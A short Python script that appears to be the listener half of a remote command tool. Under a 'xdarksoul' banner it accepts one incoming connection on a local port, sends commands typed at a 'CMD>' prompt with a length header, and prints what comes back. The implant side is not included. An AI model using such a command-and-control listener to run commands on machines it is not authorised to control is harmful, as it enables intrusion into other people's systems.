#!/usr/bin/env python3

import socket
import pyfiglet


def create_server_socket(host: str, port: int) -> socket.socket:
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen()
    print(f"[*] Listening for connections on {host}:{port}")
    client_socket, _ = server_socket.accept()
    print("[+] Connection established")
    return client_socket


def send_command(client_socket: socket.socket, command: bytes) -> str:
    HEADER_LENGTH = 64

    command_length = len(command)
    send_length = str(command_length).encode()
    send_length += b' ' * (HEADER_LENGTH - len(send_length))
    client_socket.send(send_length)
    client_socket.send(command)
    output_length = int(client_socket.recv(HEADER_LENGTH).decode().strip())
    output = client_socket.recv(output_length).decode()
    return output


def master():
    print(pyfiglet.figlet_format("xdarksoul"))

    host = "127.0.0.1"
    port = 50505

    client_socket = create_server_socket(host, port)

    while True:
        user_command = input("CMD> ").encode() 
        if user_command:
            output = send_command(client_socket, user_command)
            print(output)
        else: 
            raise Exception("Enter a valid command")